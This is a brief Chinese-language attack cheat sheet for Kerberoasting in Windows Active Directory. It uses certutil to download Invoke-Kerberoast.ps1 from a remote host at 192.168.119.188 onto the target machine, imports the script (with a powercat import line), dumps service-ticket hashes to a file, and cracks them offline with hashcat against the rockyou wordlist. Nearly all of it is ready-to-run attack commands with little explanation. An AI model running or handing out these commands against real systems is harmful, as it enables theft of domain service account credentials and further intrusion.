# \*Kerberoasting

**提取**

```go
1. 传输（有时候不好用用别的传输也行）
certutil.exe -urlcache -split -f http://192.168.119.188/Invoke-Kerberoast.ps1 C:\users\Nathan\Invoke-Kerberoast.ps1 
2. 导入模块（cmd以及ps）
import-module ./Invoke-Kerberoast.ps1
powershell下如此导入
. .\powercat.ps1
3. 提取到hash.txt
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.txt
```

**爆破**

```go
hashcat -m 13100 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

只推荐hashcat，john不太行
